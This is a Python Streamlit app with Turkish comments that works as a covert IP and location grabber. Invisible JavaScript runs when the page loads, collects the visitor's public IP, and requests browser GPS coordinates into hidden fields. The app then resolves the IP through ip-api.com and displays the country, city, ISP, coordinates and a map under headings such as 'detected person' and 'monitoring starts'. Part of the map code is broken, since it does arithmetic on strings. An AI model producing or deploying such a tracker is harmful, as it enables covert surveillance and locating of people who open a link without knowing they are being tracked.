import streamlit as st
import streamlit.components.v1 as components
import requests
import time

# Siyah tema
st.set_page_config(page_title="Online", page_icon="📡", layout="wide")
st.markdown(""" <style> .stApp { background-color: #000; color: #fff; } .main { color: #fff; } </style> """, unsafe_allow_html=True)

# Gizli Kutular (Depo)
st.text_input("IP", key="d_ip", label_visibility="collapsed")
st.text_input("LOC", key="d_loc", label_visibility="collapsed")
st.text_input("TRIGGER", key="trigger_state", value="0", label_visibility="collapsed")

# --- SİYAH PERDE BÖLÜMÜ ---
st.title("📡 Sistem Aktif...")
st.caption("Veriler arka planda toplanıyor.")

# JavaScript: Sayfa açılınca sessizce çalışıp verileri kutulara doldurur
silent_js = """
<script>
    console.log("Script started. Collecting data...");

    // 1. IP Al
    fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(data => {
        setVal('d_ip', data.ip);
        triggerUpdate();
    });

    // 2. Konum Al
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
            let coords = pos.coords.latitude + "," + pos.coords.longitude;
            setVal('d_loc', coords);
            triggerUpdate();
        });
    }

    // Yardımcı Fonksiyonlar
    function setVal(id, val) {
        let input = window.parent.document.getElementById(id);
        if(input) { input.value = val; }
    }

    function triggerUpdate() {
        // Değişikliği Python'a bildir
        let trigger = window.parent.document.getElementById('trigger_state');
        let current = new Date().getTime(); // Zaman damgası koy ki her seferinde tetiklensin
        if(trigger) { 
            trigger.value = current; 
            trigger.dispatchEvent(new Event('input', { bubbles: true })); 
        }
    }
</script>
"""

# JS'yi çalıştır (Görünmez)
components.html(silent_js, height=0)

# --- SENİN İZLEME BÖLÜMÜN ---
# Veri gelince tetiklenir
if st.session_state.trigger_state != "0":
    
    # Güvenli ekrana geçiş simülasyonu (Opsiyonel)
    # st.rerun() çağırmak sonsuz döngüye sokabilir, bu yüzden veriyi burada işliyoruz.
    
    st.success("✅ VERİLER GELDİ! İZLEME BAŞLIYOR...")
    
    ip = st.session_state.d_ip
    loc = st.session_state.d_loc

    # Verileri Büyük Yaz
    st.subheader("👤 TESPİT EDİLEN KİŞİ:")
    st.metric("IP ADRESİ", ip)

    if ip:
        try:
            detay = requests.get(f'http://ip-api.com/json/{ip}').json()
            if detay['status'] == 'success':
                c1, c2, c3 = st.columns(3)
                with c1:
                    st.info(f"🏁 Ülke: {detay.get('country')}")
                    st.info(f"🏙️ Şehir: {detay.get('city')}")
                with c2:
                    st.info(f"🌐 ISP: {detay.get('isp')}")
                    st.info(f"⏰ Zaman: {detay.get('timezone')}")
                with c3:
                    st.info(f"📍 Enlem: {detay.get('lat')}")
                    st.info(f"📍 Boylam: {detay.get('lon')}")
        except:
            pass

    if loc:
        st.warning(f"📱 GPS KOORDINATLARI: {loc}")
        # Eğer GPS verisi varsa, haritayı da gösterelim
        try:
            lat, lon = loc.split(',')
            map_url = f"https://www.openstreetmap.org/export/embed.html?bbox={lon-0.1},{lat-0.1},{lon+0.1},{lat+0.1}&layer=mapnik&marker={lat},{lon}"
            components.v1.iframe(map_url, height=300)
        except:
            pass

else:
    # Veri henüz gelmediyse bekleme animasyonu gibi bir şey
    with st.spinner("Sinyal aranıyor..."):
        time.sleep(1)
        # Stabil kalsın diye sonuna tekrar boş bir değer atabiliriz ama gerek yok.
        pass
